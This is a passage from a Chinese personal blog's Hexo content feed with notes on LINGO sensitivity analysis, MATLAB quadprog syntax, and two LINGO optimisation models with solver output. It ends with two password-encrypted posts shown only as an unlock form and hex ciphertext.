class="hljs-number">10.000000</span>          <span class="hljs-number">6.666667</span><br><br>        <span class="hljs-number">3</span>          <span class="hljs-number">480.000000</span>         <span class="hljs-number">53.333332</span>          <span class="hljs-number">80.000000</span><br><br>        <span class="hljs-number">4</span>          <span class="hljs-number">100.000000</span>         INFINITY          <span class="hljs-number">40.000000</span><br></code></pre></td></tr></table></figure><p>以上显示的是当前最优基（矩阵）保持不变的充分条件（RANGES IN WHICH THE BASIS IS UNCHANGED），包括目标函数中决策变量应的系数的变化范围（OBJ COEFFICIENT RANGES）和约束的右端项的变化范围（RIGHTHAND SIDE RANGES）两部分。<br>前一部分的输出行<br><code>X1           72.000000         24.000000            8.000000</code><br>表示决策变量 X1 当前在目标函数中对应的系数为 72，允许增加 24 和减少 8。也就是说，当该系数在区间[64，96]上变化时（假设其它条件均不变），当前最优基矩阵保持不变。对 X2 对应的输出行也可以类似地解释。由于此时约束没有任何改变，所以最优基矩阵保持不变意味着最优解不变（当然，由于目标函数中的系数发生变化，最优值还是会变的）。<br>后一部分的输出行<br><code>X2            50.000000         10.000000          6.666667</code><br>表示约束 2 当前右端项为 50，允许增加 10 和减少 6.666667。也就是说，当该系数在区间[43.333333，60]上变化时（假设其它条件均不变），当前最优基矩阵保持不变。对约束 3、约束 4 对应的输出行也可以类似地解释。由于此时约束已经改变，虽然最优基矩阵保持不变，最优解和最优值还是会变的。但是，由于最优基矩阵保持不变，所以前面的“DUAL PRICES”给出的约束的影子价格此时仍然是有效的。<br>题目的后几问是更细致的投资问题，答案使用了 Lagrange 乘子，这里我并不了解，先挖一个坑</p><h2 id="quadprog语法"><a href="#quadprog语法" class="headerlink" title="quadprog语法"></a><code>quadprog</code>语法</h2><p><code>x = quadprog(H,f)``x = quadprog(H,f,A,b)``x = quadprog(H,f,A,b,Aeq,beq)``x = quadprog(H,f,A,b,Aeq,beq,lb,ub)``x = quadprog(H,f,A,b,Aeq,beq,lb,ub,x0)</code></p><ul><li><p>H 是目标函数 Hesse 矩阵</p></li><li><p>f 是目标函数线性项系数列向量 <strong>（线性项即单变量一次项）</strong></p></li><li><p>A 是不等式约束系数矩阵（不等式都要化成<strong>左边 x 项常数</strong>）</p></li><li><p>b 是不等式约束列向量</p></li><li><p>Aeq 是等式约束系数矩阵，如</p></li><li><p>beq 是等式约束列向量</p></li><li><p>lb 是 Lower bounds, specified as a real vector or real array. If the number of elements in x0 is equal to the number of elements in lb, then lb specifies that for all i.<strong>即下界列向量</strong></p></li><li><p>ub 是<strong>上界列向量</strong></p></li></ul><p><code>x = quadprog(H,f,A,b,Aeq,beq,lb,ub,x0,options)``x = quadprog(problem)``[x,fval] = quadprog(___)``[x,fval,exitflag,output] = quadprog(___)``[x,fval,exitflag,output,lambda] = quadprog(___)</code></p><h2 id="实战–水库供水–Lingo-初探"><a href="#实战–水库供水–Lingo-初探" class="headerlink" title="实战–水库供水–Lingo 初探"></a>实战–水库供水–Lingo 初探</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs matlab">model:<br>title TRanWater;<br>sets:<br>demand/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>/:a,d;!四个小区，其实意味着a,d的范围是从<span class="hljs-number">1</span>到<span class="hljs-number">4</span><br>supply/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>/:b;!三个供应站<br>link(supply,demand):c,x;!这个意味着c和x是二维数组，即c(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)和x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>),其中<span class="hljs-built_in">i</span>是supply的范围<span class="hljs-number">1</span>~<span class="hljs-number">3</span>，<span class="hljs-built_in">j</span>是demand范围<span class="hljs-number">1</span>~<span class="hljs-number">4</span><br>endsets<br>data:<br>!demand;<br>a = <span class="hljs-number">30</span>,<span class="hljs-number">70</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>;!基本用水;<br>d = <span class="hljs-number">80</span>,<span class="hljs-number">140</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>;!最多用水;<br>!supply;<br>b = <span class="hljs-number">100</span>,<span class="hljs-number">120</span>,<span class="hljs-number">100</span>;<span class="hljs-comment">%供应能力</span><br>c = <span class="hljs-number">160</span>,<span class="hljs-number">130</span>,<span class="hljs-number">220</span>,<span class="hljs-number">170</span><br>     <span class="hljs-number">140</span>,<span class="hljs-number">130</span>,<span class="hljs-number">190</span>,<span class="hljs-number">150</span><br>     <span class="hljs-number">190</span>,<span class="hljs-number">200</span>,<span class="hljs-number">230</span>,<span class="hljs-number">100000</span>;!管理费;<br>enddata<br>[obj]<span class="hljs-built_in">max</span> = @sum(link(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>):<span class="hljs-number">450</span>*x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)-c(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)*x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>));!没搞懂这句话！！！！！;<br>@FOR(demand(<span class="hljs-built_in">j</span>):[DEMAND_CONmin]@sum(supply(<span class="hljs-built_in">i</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&gt;=a(<span class="hljs-built_in">j</span>););!约束条件一<br>@FOR(demand(<span class="hljs-built_in">j</span>):[DEMAND_CONmax]@sum(supply(<span class="hljs-built_in">i</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&lt;=d(<span class="hljs-built_in">j</span>););<br>@FOR(supply(<span class="hljs-built_in">i</span>):[SUPPLY_CON]@sum(demand(<span class="hljs-built_in">j</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&lt;=b(<span class="hljs-built_in">i</span>););<br><span class="hljs-keyword">end</span><br>输出<br>Global optimal solution found.<br>Objective value:                              <span class="hljs-number">88700.00</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">100.0000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">40.00000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">30.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">40.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">10.00000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">50.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">50.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">30.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">99800.004444</span><br></code></pre></td></tr></table></figure><h2 id="实战-2–圈地模型"><a href="#实战-2–圈地模型" class="headerlink" title="实战 2–圈地模型"></a>实战 2–圈地模型</h2><p>果然 lingo 求解多变量线性规划简单。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs matlab">model:<br>Max = <span class="hljs-number">0.09</span>*(L1*L2+L3*L4);<br><span class="hljs-number">0.09</span>*L1*L2&gt;=<span class="hljs-number">1000</span>;<br><span class="hljs-number">0.09</span>*L3*L4&gt;=<span class="hljs-number">1000</span>;<br>h1&gt;=<span class="hljs-number">20</span>;<br>h2&gt;=<span class="hljs-number">20</span>;<br><span class="hljs-number">2</span>*(h1*L1+h1*L2+h2*L3+h2*L4)&lt;=<span class="hljs-number">100000</span>;<br><span class="hljs-keyword">end</span><br>完全直译即可。输出<br>Variable           Value        Reduced Cost<br>L1        <span class="hljs-number">1144.591</span>            <span class="hljs-number">0.000000</span><br>L2        <span class="hljs-number">1144.591</span>            <span class="hljs-number">0.000000</span><br>L3        <span class="hljs-number">105.4093</span>            <span class="hljs-number">0.000000</span><br>L4        <span class="hljs-number">105.4093</span>            <span class="hljs-number">0.000000</span><br>H1        <span class="hljs-number">20.00000</span>            <span class="hljs-number">0.000000</span><br>H2        <span class="hljs-number">20.00000</span>            <span class="hljs-number">0.000000</span><br><br>Row    Slack or Surplus      Dual Price<br><span class="hljs-number">1</span>        <span class="hljs-number">118907.9</span>            <span class="hljs-number">1.000000</span><br><span class="hljs-number">2</span>        <span class="hljs-number">116907.9</span>            <span class="hljs-number">0.000000</span><br><span class="hljs-number">3</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-9.858541</span><br><span class="hljs-number">4</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-11790.79</span><br><span class="hljs-number">5</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-1085.854</span><br><span class="hljs-number">6</span>        <span class="hljs-number">0.000000</span>            <span class="hljs-number">2.575329</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束优化 </tag>
            
            <tag> lingo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Experience-in-Mathematical-Modeling</title>
      <link href="/2020/Experience-in-Mathematical-Modeling/"/>
      <url>/2020/Experience-in-Mathematical-Modeling/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="52f72c86c31c76c8e2d3180930d69a8f1bda25ac5a72905d321562d351aac231"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FAQ-and-their-solutions</title>
      <link href="/2020/FAQ-and-their-solutions/"/>
      <url>/2020/FAQ-and-their-solutions/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f31f03f4bb73bb430cef92919c500e3e7759cc9ff5c440f17826a253fb5a3cf3">042fc2365e7574de6a7704120abbed317c3a840f835465064ebdbb52cd0ed44d0df09e3eb58c9a79075c26398c92a39d3e91b8904b9c821fbca479069fbc0e27849bd8e7da1aad667b03b9959e83cfa42ecf3c474b5640d5e357f9ef7d326df58a007043c678755f0dc1c716829b957513bf9b7bb2cbfce7808a7823f1fce46716e78188da4cee2fac74934533eff6157110f255cf5e2839641df51ce80fb624114423385342a77f3f4208e91986e2abc27a7e6904702054aa1119fa57b76ec6d6abe2a8fda28681b4117b4c95f2f002df01cbd984348dcd05bec84f91d87cecf4b5f90819944aac1d80b530fc401eaf7212ca445261f72621d10cb6b89196a996aa7af76fb5baf90b85ddff242d74f2640b10101f6e33f64b04ee75872baf2942e56174eb1276e581e9f009d4ab62fa2c114d2916805593594e9d79e34990a64059a7c5dba4d3ad415d8fe21f25b19692565c39e0299d0a27f396b514393685028f7a3e4556f2602299607605fd187939d7435f8e3f00e786e0f05328cebf15a007b97e4761ae9659603d48ab53325950eaa47cdceccb5089bb51534fffc0445699c781175c4b7fba5664339bed4f7ea2930eada1707d3c1f9b3cf7581fb62aef724ee38797ff4af6973febf965551c68ea7706d3ae440eb6644ee8f488006ba961a0c4c74b027db750aa8e7cb60ac993c0ed82e961c2b94d81719dbd457a8bdf249b1450cdfe5d22f7ef9954c4b5d801fc96226ea07beb3d7cdc9a67f405834687970f684e3c850ce4de4d444ac2c4969990212955241dd1e3647eb3fbaf2ab5bc3397d27dfbe10bba80f443eb37e6bb1e70c4146f7c0c3be2117ab38af5cd746cf59767fced7e605f16ee855aefe149dc13d1bb7f68d208b7645e7b59d7cc034009e5dcb1271f0137577660cee9eba6d7269b09946a7d8b4eada953ac52c731f04d090c130207a2181530a467dfd9db21eccf07d7af9fd78b267b6d51a8fc219b60824c091aace38aff9629d6c36b58b2b171b352ffd0beedbf3398a2539460ef6a99c15bdbaa5f55857442687b15fe1d4317a660284abb3af4ae48a5a0083b5e065975198b2766e0a30444486b7cc6dc903c576349904deb7da28865d9984a6e28897bc4f12c8bc6fc6b5ae8642f6afdefdd2c35012524e36cabc13754e5227fc2834dd9466dcbf4af0ac8860c7a194924c6701e841dd628a113bdd0f9ab202619fbb22c9b19e86bb3467fafc00f163e42a80a079a337760eee5be1b5da454bb66c124b06a5a75fe1af6c9f87fd97a031265b09ba3540fb6c0e837e28ede2249be7677fa2d3f781900a7f05b479ebf54aa53a8e3984dcd25afd6d144436c77e9b4493d33916cc0e2245f36722d96aa53460145cfe9f5a4d0708055ee242f3bf756a8823acca0787bea9a512bc8eaacc51c3a3ba07525f40da8ce766f488d5479890ab197c76136854581b1c28d234bb1c6a7f8c382f9bde653eb756381c106fad93d7aa85a3866f3a874076822212d7a42c4eca5a8221ef1a683062cc53991509dea4d2f48a52b48bbf6aeee3953684514dfda45dc5165f8598da406f8fc33109df2bb5b757bcc6090c62696ebe36b006f79d8d50f064b65e07b0843f48794fdab925adfedbb8d81542955e82fa1b49b80b843db7c9c2d18096c76e1f1eeef9af2ede3301f17b0d0e32076c4248f710d2673af922667d9cc568cce05381335380f9e2a2a55396764496ae5b0f2141add9dba97db32be9e736a782972cfcc933107e7bf2b776a67ebd7fc76cdd489d82950a977d2db408786839d92cb8cd27cb526787c78e5302031e9ffa835e9e8213ed994651b06787de1e0c948e7cb4068da6e533373288df15ca5c833056b3627a785024108caa37dfdcc88824bf1442349c3e2c4af07bf29122b77d642d4d527508159788951fc942146b0ed8d2c0ec226518f7f4d44c3328ce26b6176e9dc9f396008f5c27f8a623e00d1325420f7c17f5c6db2093dc5b3168dfec059e3cc10f80f4ae3f98880a356fe6d8bd5bdbccf72ae0bf8ffb5451cd5139df92e48f3eb993610a87ca787126f33fbb13efb0bf899c153e650daf8e69307617a6391a459dd46db1d96c0c712e6253e7f958c1e6c591faa741a109735ddcc89d9eedb294855e94a6d1e6267023df63130997f9c34c1787c7e19dbfe34aff0f0cb7cf2951b446d83780a2f17fe5e0dfcca93f10dfbca25e89c63e99811e797e66cf0afe312bfb670d30a03b438b5e80e7489168ebfddbe9ddd87530faa98c492867525c7d0e94f2d64c202b50b3434d399c17891f0ea2417d7f5bec096811a1376ee36e9da697dd1368d8434e236f45cf8c8cf7c7615980425115dc2f8c2cafdeb323eb55ebe12ce89d42b179cd19195f08fb0ad0075f8a3680cb77802cb83d6b674d64520eb823d06c4637a326136986592b3a1fbb09bc8f934857bdc7e1175501ca40b893dd5210e25496904a8d1fcaaf792ad8882b209e698b3251e29061aa1ad6c5c83bc860a77657e57ef075b8384d71a0ee4061ebcd8f04ac0d3726804403c40b0e0b3b3dc22d1aeb5d558e6288c1482fc680263149ecccee57ada1ebb833cb9a49181a286b974078e3a822b7f5edd7b74decff1dc3671b6879b1c14452601bd9543d1d7fac8168fe91ab7f0b17325a28fbd446b0e1e3e2ac0dae4de182d925f9f1a2c778cc6f3364cfcc2ac5dc00fe24ebaef6869b49e0ce97c2323cf9e6b5b88034a9d69e372c657ba0afba72c92973f2c316a12658a56e1aac7afd8aba5a3dac7d078a5d5fe7dd624e022b5bbb399890b4f0b6b97c6eb7d86c7ed1eab887edb273f38721b762e99d154f3234a31e83fcfe63e49c43610033faad94fcdee2dfe97c2e5c7fe738ea56ec9999221a296c53f3cb8e651a0d9d4e16f19f49fe9794e99cb84f7db0e421aab07e1dac8703151fc5459ef5b26e0cfee0a7d0234de19345bb416f04b9e39e16f69e329bb0d728fd0ca479b4ad34a8a270f4284ec4b90b81773a2b948282b02671c918ee5f4acd4beee17b2a76f3b203360adff59b0dd0c6a6b1bcb2967a107fe5171923f9b5298b33c875b9df010d15707df11f7e1140906603009fa993d52f8726750e454aec79e3c631ba1ba0156351b5e777a0bfc2bf6e09402ed78d1e0128e3c7795aa88e1789fc9218e0782a9c88b2c3a3cb1ca6baff480cf3d1c74afd475feac5b6cb3a83b65023b473661b96dc9d2a5ea0d4988f79af980912c00342d93e55ff9ec2cfb2e383e1d71cb86f1e856c81cd2a2c13fdef184ff977d51a89fa207e93ae6174f9665f9de46c3b95c3e8c72825cd02904182c33f1b7601415c5c9a74c6f30981dfcfb7f247da6a7119c28cf0cdc0e980e92fb2a1064c042241131b5e1262bdd9546b23f8254174bdb78bfd1b53c718c5c2284ecc1e82e0efe1c359f2db22acbfdc5d659c43ca7262af562eb88ba6045b5fd5564b088af2257a7c1aa370de686c1565b21cf8bc6a736a0d88dfc34d4dcf48a466e6cad574e4da713c8edda1f62340ed13e6952e3add893914404bfdb7bc7bcd3d35d82cac66b1c129fa2dc00a09100be9bdb25d8ed7373119a4604c73a5ea1ae74ec44ea0750612d3bdb595979997778b493812f597d6084459d7a5c4c12c0d09144f1a5beb258c7ad59bc4308ee7dd1e977ac00be3d8aeccec8617befee722fda1ac84a9c48236d6927f6ff69c79053f9a1e7ada5468c9270fc7cf87993f67bdadf5bbacae5e07fa2a1c81eabeb2c0d4ea12410761b510f2c4763022d01de127bf4eaa54628a59e67824d89222e67914ea80af33b5798c680bd4479af8bbb5e7c461182d234e05dad0be396122a751bfb6dbd86da4f2c7d818a18d0b035f748275cb6e2d342d995bd164ccd02ad9e5c7ce67c8ce7cb1cd908d22671e4bcb7fc600b203c04f815b9477a45958c33dfdf14d397a22dbdfe19b87a1a34a01492f93a6fd372c83487ba598bf176c44f71d0c7140b8184d6f8a51c9f634f5c7f949a219c6c22d708e83356408180d34df982a45842d40427671b9ad8687665f971a45a119d57def982d152b002426b1dc4c5b86ac2ec001bc4de263ab53544536a9e95a42e8585859b9fd2b71b6cfa04e2806db962fd5db6b9d703556bcedc4c0a81aec6781d38439030845d4a530e7af002d664290db9ab669128779c5f46759dffab1456b88662a3fd48f6130436677b0e1e884c699a0b650e4f7b02137b7a8c38fffb62aca87370d820e0bc7647152484629a3ce0a1faa30628ab90815070014a6a780bc56fea49785bf7e7dfe2739e94891ce35bef06200ef0ac74bc31e4b4ee44306bf91dac7a4b496c7a318e570627dad57101c8789fe30860bd7d3b4348cd9e46b480217c893144d0dd35b1bdcbd0e5ade0a9461db13444236dc7561373e6fc6eddc4ea8270e6ae475ce0498680d8f3afac4dbb03ae1e2455ba3df1ae23f7ecb756977f33220f5f33dce6a8254594c85046a55850a277b05e45c3a2abfe504b12b6bd680ba91bee45257b8b7ea0d4d4d0220e0f3d8ce329d6ffe57799ef789a9ea1e41b518121bcc2ef18dce4f399fde99aa103e450affcd75ba1fa5941f8a42c95c1c534adb18f841b7252d9a66c0b3316f1a7b73dca6f7cfe9ee54eafdc99d32ddb744913dd27c347a0f09bde6ff58bf4dcdc320235c1373028f4307828b687a2b765f7f713e049744f06d5e095652c0c64d997b48af31501928d42d47f391a20b0459c9c36b16bafc8e3ea456c9a2ff0601e02f327e2b687e57fa5fc3c2fe87d44c25ac559e952b116f67aff8d573226b81d7a7a9c225ba965f6d07c889e18782cc1c5f090be72efcb8176636b83fa8bf19e5e3450a178fc761600684c5c4944c7a97158e008d0df79de64794c08050ec03155ea6448ef014c6a2ed03560a6324eac995d028b51834ae7c6cba94317a1837e1b9a592a0ad6ba5aae1d468e9adfe7f1c786742ce5b039cbaf3f527eb5e49962b747ac0b493fd6e623b73315499433e07be3bc73e08d635765769afd29b8e8c0d8d837c6a227ab615028abfcc0a4c65a3b3ffd5bd7b7f82e3d41c0068fb4c41ee8e81a34c811b6ef604715cae3b4b7193a8e14710cc3205bffebec65970753724f8419996e26ba895f0b8e2e178bc5e3f0b5de099802b2fd58712e9347b01fa9634012bc5c7a481854d6accba34793614db6e9c12cdb601c8b59cbdef62d6c9d3640b34d3c66ebfe270d49638647bb7097502bf5b9790cad765f001fbf44964800ca9a44099d354b9e56daec49c97006b22465c97df22e41ae5d9d43a0e4205b568c6ffe16b9456ceb6eb056c6e6d3f88b264cda6406ba32fe69e0447c771ef4486ce7ad6f11df2c25475c89d953887ec1de728f9205cc3f8a49f7e773b3dfadae6eb0df2e86185d5ac543231c063b8fa8c77b39225a78e5f6b068f6fa4394f3e25278183e6648f152ea0ff6816e1fb483c06596b2317a392c50078ebb0b0b1b1f58e7921a04bea549de47aeabf8f8e8f475307d892f56fa32ddaca323fc8a74001329619326623ec86d2a1f97034e04af07adf72741f028395a9240de7f3ecb456ae5f6638827f3b0d766d252cf4a8627b7dd10ede4285b7e4f5df5e3f4783d2fd598ad1ece71842a8b8abbb9c38581771cb9147bbac34978033f090de0d1c1cb25404948b0a9ed5a5bdb88872bcedd5a4d606300827f8879debafa31e020e8a986cfb92a9ad617bdfefac7792992275a5c9eb63361980c2449527aa0c26ba3dc7c1da6e032c19e28409739fa7fbd16d2049b5624db56c703b65bbe1daed00929a347a822514e4476b57c4c69f8d10a9b95e38f6b973ca538906d12ef21a4b02b658bcdeedbb0ed93e5b7e8186e1615d4eeacf73f3bce2f6309eca0d877c967e4c606bcf6fff71ec7ab4c1a7865e2327e7b8624ae16583780184fbdbbfa6ec6b6fd0d480405ca3787beb5833960ce533d9d881522cf43c7108d6264df38a5a40482f1c720c8800d3c4188873d732f5ea7d23143221ff2dcb4013f69d9e335c1d8baa049ba30e2575f796fa70410ef06f2983c25c433e7ee2e6e4addc3ed74c3c239963e82198a1379c6461a6a13b7c2db91e397d6c35fe626fd4099a431e1447926a2d17a458a7cd76b6776f1cd3a5d5e177615a59ec0727c0b127d513711cd9c4581997340abc8540a41332024abb4e84d807afe698f4e856527f0a6e9015851881aee34ab18c1399332713e388ecec1a1ca4bd1dc2c322de016f049ffe9886fbe0bb1d213557f0272b4fa01b57d4412aec22cb0a7455095093bcaedbb3848eec16955b22f49971c6c3f85df4e1e6887f7ff157e3f2ab64a5a221293b8cef01d1909bd322b2c0993b963dd443aa6323d237cf94d3790327c08dcf03ab3b170ceae4c408c514735210a8f1cf81b7bc53063aa1c8a279ccb7943a1e9c3328aa9a6f69d3be53e7f94833bc5fcb00037fdfc51b39c700535ae87f08987cc33172241e397e64458ff3f64f938534d0258ccc7bc5d3ef2cb4c8e0cc178dd13d2f865029a01340146cee846faad2d6f6e506cc18f4e6cb006acd7153f63b3b25a3622f844bf51b2c70729fddb9bdb95e87fc8c41d32f6b699e3becc56b44b1033ee58117a68a389a96b88bca2f8836a40c545a944fa4acc2179c44434a63af37a56c8e68004ca9f8fdb6d616bb73659370a24b6272b51269917eca5623264b540232ea5b995c5204abd985f63896cf824128e6b6584abad2161ec93b545bc8b43b831ffea08db4f1b8c391a01bd4e58878a4396303c3ff51a7735f1a7e6afd9bf61411520c30b3b8acd4eb2bd71df96d05194b19282174f24825129dc1fe497853b15ffe983f3040bb7e5a22f597952ce5754b05347e8eebce6b7beafaeb435a4e8b358220a9afadeb40ed53176e070b4fb4488b0337ada254d773ec30a5a8c17d31c3d9c489ca12663d97d8d3cb977688157cd3588afabb62cb0612c917804511dcb765f0006e16f584b39958fdc743dda106ac83d323e4cffc093888257e2a3f20394a76c4fad272845a3901d34fddb72aa729aff8b1a054a0ceb6914650c41b4c94d42b07e88a8b31d37d04849da07a2e7af6b5e1356d62c915a812ec70f49247be2da45506cd79b79cc0574632e60f2fcb60ff2c1836a7b1935381ce3d35526457ff154c95d79bf3f3d6a20965edf8cdb8ae609516a707c53a2667060ae3aa8d3d97a57054a6c803d1a053eb3ab0852af9da49ea22dbe63294e6892d7024ed8559d6db746e49d65b1e1c2fd46c702b4f6181db1c5c3dedbad80fdb0e9189a8051ddabe79fa18520019f1d130543f5e7c6d194ee0ce43c6484222c3c067c5e14812ac8a5434733881e875f00616480c59bdd3d985fd19c3bb903a92bb864764b9502ce1d13482889477f1e43ee7ae0a73a94bc091d14ede319b1e4f407bbe0b0b61b050b292e5947f9663c1c434d0cfee158d04d8d8eac3b04d29bee1835461a635f2e724d8e239227a223a86362366e5cd904d10fe80cb7db2d36ef37a8013799579a5166d28a02e215f5c1943f10a2d7d4b87af842bce43b2668ba8122b187a751c2c64da4167d5931bd090308964e5473d4ca39953ac40b807eb7c17b44bab69fce384f59354a883eeaa84f097e451bb25aaa6b9f59443cf787f02a5b94997f0d1692ef60f4ef88a04af79a1c6cdd75b112ac13c202083380050c37a06158977c063a98b10c54c6f52cb630b0649c9e024e9d2523dcadb61941b13f27f14728dd9a10a5d400e137ceafdd45d51920808d3aa0804b3c70d74d87f2a04a2610324f444e7cb0494ef1fc7d60229bb560aa51a7b509228ebd6520b4ace5ba1c0c2cc0170e7761e1c86f8eb9ec45e9825c19423ed1cb9640f8b5058c5a10b719b2ef1fd335b68fe592f6a733af283d2ec57262824cb79f7ef39d06e6e3537687756a55fcc633ace48aa7ab950114462ba4e4a7e39743309bfbea77484813fdffeaeaa6599b4440e2a2d206a3281790816e25a84298106bfa22f43890542bfb04f615acaa94fdcd53d5c5c0922ca0bd03e9d14df1a42e1dd8687864082bba51e527adf9daceeedcdeb2e65195e21ed7d78e45d71ee240f148ffaaea4f331e886b0cc74dcd3209752cd52273ab9990fb5bb6348639823f8bb3fb574cb3c926879626946af4708ee7901038b9875306da33fbe0b92e1aeba958e3dd755f3625a907ef204777a0cf46d5c9042f80c87a0090fe7eea8260540e55b7668b071b9b74e63b279b0cfb55d1909615e91c2bc3ef7695f7064a91485d33c69372da725b1ef094c65c9cd9b36db945f309df707357406bd25e4fbf5ae26dcb58e3ca08e4288793f84a3e765510b7dfbff6d404f1ae5183b0de76326d95e018b611b5401a641da447be5cece8fcd61fe1ccd143e73fe088020e0bf0d9ce50c6cbc22c360c87c3513cf8831b98c23413af655d7cc6826109efc484d91215c53518547dd8dc8219f0f0e20564f592c91fe52160d4aead848baad495e28023ca10000a461f32d0b30302bca69eea387c9724413baee846a98f1a4914aac4188a2c8ebbdec183965e54fc705f6b127f6865615e5277186ae9c634e71a15a9916b1dd8a00ec07bb838ba151e397f09ed062bdec3a656fc9990013e452a3770e5cbf124aff060b1fbcb4e099edecb3ba18691de33d2fa9ac3110787fcce34a2ed8248763176b90b2e62d419af64a47cd244286b43c9dd0eb2eb6bfc52a5a5f2141c1f1ecd621f2a64274341ed99d9c0e5f0d80bbb2d9cb2458469f25a45d87bf28f9ca40b47a01f2a917f6c9e757cb783c1f5975915ccff3017edb5b08de406a1f69359c3074a38712bfd42d0a99e4f9d065632b2b0c42dd33a756c62095225c49436c56f38a75e6668eeaf70de829caec2f630d19d395b1ab9eb93cbd810c777e159604c6d3ee0c35aac33d01ca243699671a35c94894110e4c890120723c4c12959383d0a76bb6226741a4e4cbb445e3269e8046f926f565ab113355ada3a8453e2a5cb4b552d63b1dbc68b271ad6be6e7a639fd202f7030138599d4b38c67f50add34d9f8cbeaa7bff9329c7dfcdb7dd21619b2a71037f7803645c36d52d7a708f317da79da062afa64322d3ad2826b99d6f6c78e948b6950d5d83a4f11a959f029c7c2657372fe2d2da42c407ee00d2b116cf8427c22ba0dd17f3f26fa66ad4b18875ce17830d8f3552fcc396f2a86c1d7f3d388b4368fb8bcd8bcba2172b62f815f6939d8a263d91b09d5df83eb8b5d2f055d917c4053445eed485ed5ab093fcb4f64f7c0a8c54d51073214486cd92746de20475b1e8d445c383a6f